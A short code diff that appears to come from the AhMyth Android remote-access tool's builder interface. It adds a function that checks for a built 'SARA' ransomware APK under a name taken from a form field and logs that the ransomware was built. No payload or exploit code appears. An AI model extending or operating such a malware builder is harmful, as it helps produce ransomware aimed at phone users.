@@ -169,6 +169,15 @@ app.controller("AppCtrl", ($scope) => {
                     $appCtrl.Log('The APK has been built on ' + 'AhMyth/AhMyth-Server/SARA/', CONSTANTS.logStatus.SUCCESS);
                 });
             }
+        //function to locate ransom
+    $appCtrl.Check = () => {
+        var nameransome = document.getElementById('name').value
+        var pathrans = "SARA/"+nameransome+".apk";
+        if (fs.existsSync(pathrans)) {
+            $appCtrl.Log('Ransomware Built Successfully ', CONSTANTS.logStatus.SUCCESS);
+            $appCtrl.Log('The APK has been built on ' + 'AhMyth/AhMyth-Server/SARA/'+nameransome+".apk", CONSTANTS.logStatus.SUCCESS);}
+
+    }
 
     // function to run mask python file
 
